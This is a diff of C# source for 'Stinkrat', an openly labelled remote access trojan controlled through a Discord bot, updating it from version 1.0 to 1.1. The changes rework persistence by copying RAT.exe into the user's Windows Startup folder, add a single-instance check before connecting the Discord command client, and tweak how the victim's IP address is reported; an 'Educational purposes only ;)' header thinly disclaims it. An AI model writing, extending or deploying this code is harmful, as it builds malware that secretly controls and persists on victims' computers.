@@ -1,5 +1,5 @@
 // Educational purposes only ;)
-// Stinkrat 1.0
+// Stinkrat 1.1
 using Discord;
 using Discord.WebSocket;
 using System.Diagnostics;
@@ -81,19 +81,20 @@ namespace App
             int last = address.LastIndexOf("</body>");
             address = address.Substring(first, last - first);
 
-            return $"IP: ```{address}```";
+            return $"IP: **`{address}`**";
         }
 
         public static void StartUpPrograms()
         {
             // Remember to change this depending on the exe's name
-            string path = $"{Directory.GetCurrentDirectory()}\\RAT.exe";
-            string path2 = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RAT.exe";
+            string exename = "RAT.exe";
+            string path = $"{Directory.GetCurrentDirectory()}\\{exename}";
+            string path2 = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + exename;
             try
             {
                 if (!File.Exists(path)) using (FileStream fs = File.Create(path)) { };
                 if (File.Exists(path2)) File.Delete(path2);
-                File.Move(path, path2);
+                File.Copy(path, path2);
             }
             catch
             {
@@ -151,12 +152,20 @@ namespace App
 
         public Program()
         {
-            // show fake error
-            // MessageBox.Show(message_content, message_title); // uncomment this if you want
-            RAT.StartUpPrograms(); // put itself into the startup folder
-            _client = new DiscordSocketClient();
-            _client.MessageReceived += MessageReceivedAsync;
-            _client.Ready += ClientReady;
+            // check if the rat is already running
+            string processname = Process.GetCurrentProcess().ProcessName; // the name of the process
+            Process[] processes = Process.GetProcessesByName(processname);
+            if (processes.Length == 1) // if theres more than 1 process
+            {
+                RAT.StartUpPrograms(); // enable autostarting the rat
+                _client = new DiscordSocketClient();
+                _client.MessageReceived += MessageReceivedAsync;
+                _client.Ready += ClientReady;
+            }
+            else
+            {
+                System.Environment.Exit(1); // exit
+            }
         }
 
         public async Task MainAsync()
